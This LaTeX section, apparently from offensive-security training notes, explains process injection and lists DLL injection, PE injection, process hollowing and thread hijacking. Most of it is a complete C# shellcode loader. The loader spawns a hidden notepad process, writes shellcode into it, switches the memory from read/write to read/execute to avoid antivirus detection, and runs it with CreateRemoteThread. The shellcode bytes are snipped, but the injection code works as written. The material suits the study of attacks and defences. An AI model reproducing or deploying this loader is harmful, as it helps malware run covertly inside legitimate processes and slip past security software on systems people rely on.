\section{Process Injection}

Process injection is an evasion technique which entails running malicious code within the address space of another process. There are many ways it can be done, including:
\begin{itemize}
    \item 
        {\bf DLLInjection}: write the path of a malicious DLL into the address space of a target process and then calls LoadLibrary.
    \item 
        {\bf Portable Executable Injection}: copie code into the address space of a target process and then executes it with CreateRemoteThread.
    \item 
        {\bf Process Hollowing}: spawn a target process in a suspended state, replaces the entrypoint in memory and then resumes the process.
    \item 
        {\bf Thread Execution Hijacking}: suspend a thread in a target process, replaces the code and then resumes the thread.
\end{itemize}



\subsection{Portable Executable Injection}

There is more than one way to achieve this, but the most common way is by making use of the following WinAPI functions:
\begin{itemize}
    \item 
        \href{https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex}{VirtualAllocEx}: allocate space in the memory of the target process for our shellcode
    \item 
        \href{https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory}{WriteProcessMemory} write our shellcode into that allocated space
    \item 
        \href{https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread}{CreateRemoteThread} execute the shellcode in the target process
\end{itemize}

Note:
\begin{itemize}
    \item \verb+lpBaseAddress+ of \verb+WriteProcessMemory()+ is set with the \verb+VirtualAllocEx()+ return value
    \item \verb+lpStartAddress+ of \verb+CreateRemoteThread()+ is set with the \verb+VirtualAllocEx()+ return value
\end{itemize}


In our case, we will additionally make use of:
\begin{itemize}
    \item 
        \href{https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa}{CreateProcess} to spawn our target process, 
    \item
        \href{https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex}{VirtualProtectEx} to allocate memory with Read/Write memory protection, write the shellcode and then set it to Read/Execute before executing. 
\end{itemize}
This is not necessary, but some antivirus solutions find it suspicious when Read/Write/Execute memory is allocated, so this is a simple workaround.

\begin{verbatim}
using System;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            private uint cb;
            private IntPtr lpReserved;
            private IntPtr lpDesktop;
            private IntPtr lpTitle;
            private uint dwX;
            private uint dwY;
            private uint dwXSize;
            private uint dwYSize;
            private uint dwXCountChars;
            private uint dwYCountChars;
            private uint dwFillAttributes;
            private uint dwFlags;
            private ushort wShowWindow;
            private ushort cbReserved;
            private IntPtr lpReserved2;
            private IntPtr hStdInput;
            private IntPtr hStdOutput;
            private IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName,
            string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs,
            bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment,
            IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo,
            out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess,
            IntPtr lpAddress, uint dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        private static void Main(string[] args)
        {
            byte[] buf = { }; //{< SNIP >};

            // 1. Create the target process
            var startInfo = new STARTUPINFO();
            var procInfo = new PROCESS_INFORMATION();
            var flags = DetachedProcess | CreateNoWindow;
            CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe",
                IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero,
                IntPtr.Zero,
                ref startInfo, out procInfo);

            // 2. Allocate RW space for shellcode in target process
            var lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero,
                (uint)buf.Length, 0x3000, PageReadWrite);

            // 3. Copy shellcode to target process
            IntPtr outSize;
            WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf,
                buf.Length,
                out outSize);

            // 4. Make shellcode in target process's memory executable
            uint lpflOldProtect;
            VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length,
                PageReadExecute, out lpflOldProtect);

            // 5. Create remote thread in target process
            var hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0,
                lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
\end{verbatim}

